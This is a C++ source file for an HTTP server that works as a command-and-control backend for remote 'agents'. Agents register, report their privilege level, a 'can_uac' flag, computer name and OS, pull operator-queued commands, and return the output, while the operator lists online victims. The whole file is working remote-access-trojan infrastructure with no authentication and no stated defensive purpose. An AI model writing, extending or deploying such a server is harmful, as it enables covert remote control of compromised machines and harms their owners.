// server.cpp
#include "httplib.h"
#include "json.hpp"
#include <fstream>
#include <mutex>
#include <chrono>
#include <iostream>
#include <sstream>
using json=nlohmann::json;

std::mutex data_mutex;
const char* AGENT_FILE="agents.json";
const int AGENT_TIMEOUT=10;

inline int64_t now_ts(){
    return std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()).count();
}

std::string url_decode(const std::string& s){
    std::string out;out.reserve(s.size());
    for(size_t i=0;i<s.size();++i){
        if(s[i]=='%'&&i+2<s.size()){
            int val=0;sscanf(s.substr(i+1,2).c_str(),"%x",&val);
            out.push_back((char)val);i+=2;
        }else if(s[i]=='+') out.push_back(' ');
        else out.push_back(s[i]);
    }
    return out;
}

std::map<std::string,std::string> parse_form(const std::string& body){
    std::map<std::string,std::string> kv;size_t pos=0;
    while(pos<body.size()){
        size_t eq=body.find('=',pos);if(eq==std::string::npos) break;
        size_t amp=body.find('&',eq);
        std::string key=body.substr(pos,eq-pos);
        std::string val=body.substr(eq+1,(amp==std::string::npos)?std::string::npos:amp-eq-1);
        kv[key]=url_decode(val);
        if(amp==std::string::npos) break;pos=amp+1;
    }return kv;
}

json read_agents_nolock(){
    std::ifstream f(AGENT_FILE);if(!f.is_open()) return json::object();json j;f>>j;return j;
}
json read_agents(){std::lock_guard<std::mutex> l(data_mutex);return read_agents_nolock();}
void write_agents_nolock(const json& j){
    std::ofstream f(AGENT_FILE);f<<j.dump(2);
}
void write_agents(const json& j){std::lock_guard<std::mutex> l(data_mutex);write_agents_nolock(j);}

std::string assign_id(json& agents){
    int maxid=0;for(auto& el:agents.items()){
        if(el.key().rfind("agent-",0)==0){
            int n=std::stoi(el.key().substr(6));if(n>maxid) maxid=n;}}
    return "agent-"+std::to_string(maxid+1);}

int main(){
    httplib::Server svr;

    svr.Post("/register",[](auto& req,auto& res){
        std::lock_guard<std::mutex> l(data_mutex);
        json agents=read_agents_nolock();std::string id=assign_id(agents);int64_t now=now_ts();
        agents[id]={{"ip",req.remote_addr},{"last_seen",now},{"first_seen",now},
                    {"last_offline",0},{"priv","user"},{"can_uac",false},
                    {"computer",""},{"os",""},{"cmd_queue",json::array()},
                    {"history",json::array()}};
        write_agents_nolock(agents);res.set_content(json({{"id",id}}).dump(),"application/json");
    });

    svr.Post("/heartbeat",[](auto& req,auto& res){
        auto kv=parse_form(req.body);std::string id=kv["id"];
        std::lock_guard<std::mutex> l(data_mutex);json agents=read_agents_nolock();
        if(!agents.contains(id)){res.status=404;return;}
        int64_t now=now_ts();agents[id]["last_seen"]=now;agents[id]["ip"]=req.remote_addr;
        if(kv.count("priv")) agents[id]["priv"]=kv["priv"];
        if(kv.count("canuac")) agents[id]["can_uac"]=(kv["canuac"]=="1");
        if(kv.count("comp")) agents[id]["computer"]=kv["comp"];
        if(kv.count("os")) agents[id]["os"]=kv["os"];
        if(agents[id]["last_offline"].get<int64_t>()>0){
            agents[id]["last_offline"]=0;
        }
        write_agents_nolock(agents);res.set_content("{}", "application/json");
    });

    svr.Post("/pull",[](auto& req,auto& res){
        auto kv=parse_form(req.body);std::string id=kv["id"];
        std::lock_guard<std::mutex> l(data_mutex);json agents=read_agents_nolock();
        if(!agents.contains(id)){res.status=404;return;}
        json q=agents[id]["cmd_queue"];agents[id]["cmd_queue"]=json::array();
        write_agents_nolock(agents);res.set_content(q.dump(),"application/json");
    });

    svr.Post("/result",[](auto& req,auto& res){
        auto kv=parse_form(req.body);std::string id=kv["id"];std::string out=kv["output"];
        int64_t ts=std::stoll(kv["ts"]);
        std::lock_guard<std::mutex> l(data_mutex);json agents=read_agents_nolock();
        if(!agents.contains(id)){res.status=404;return;}
        agents[id]["history"].push_back({{"output",out},{"ts",ts}});
        write_agents_nolock(agents);res.set_content("{}", "application/json");
    });

    svr.Post("/push",[](auto& req,auto& res){
        auto kv=parse_form(req.body);std::string id=kv["id"],cmd=kv["cmd"];
        std::lock_guard<std::mutex> l(data_mutex);json agents=read_agents_nolock();
        if(!agents.contains(id)){res.status=404;return;}
        agents[id]["history"]=json::array();agents[id]["cmd_queue"].push_back(cmd);
        write_agents_nolock(agents);res.set_content("{}", "application/json");
    });

    svr.Post("/results",[](auto& req,auto& res){
        auto kv=parse_form(req.body);std::string id=kv["id"];int64_t since=0;
        if(kv.count("since")) since=std::stoll(kv["since"]);
        std::lock_guard<std::mutex> l(data_mutex);json agents=read_agents_nolock();
        if(!agents.contains(id)){res.status=404;return;}
        json arr=json::array();for(auto& l:agents[id]["history"])
            if(l["ts"].get<int64_t>()>since) arr.push_back(l);
        res.set_content(arr.dump(),"application/json");
    });

    svr.Get("/agents",[](auto& req,auto& res){
        std::lock_guard<std::mutex> l(data_mutex);json agents=read_agents_nolock(),out=json::object();int64_t n=now_ts();
        bool updated=false;
        for(auto& el:agents.items()){auto& a=el.value();int64_t last=a["last_seen"];
            bool online=(n-last)<=AGENT_TIMEOUT;
            if(!online&&a["last_offline"].get<int64_t>()==0){
                a["last_offline"]=last;updated=true;}
            out[el.key()]={{"ip",a["ip"]},{"priv",a["priv"]},{"can_uac",a["can_uac"]},
                           {"computer",a["computer"]},{"os",a["os"]},{"online",online},
                           {"last_seen",n-last},{"first_seen",a["first_seen"]},
                           {"last_offline",a["last_offline"]}};}
        if(updated) write_agents_nolock(agents);
        res.set_content(out.dump(),"application/json");
    });

    std::cout<<"Server started on 0.0.0.0:1143\n";svr.listen("0.0.0.0",1143);
}
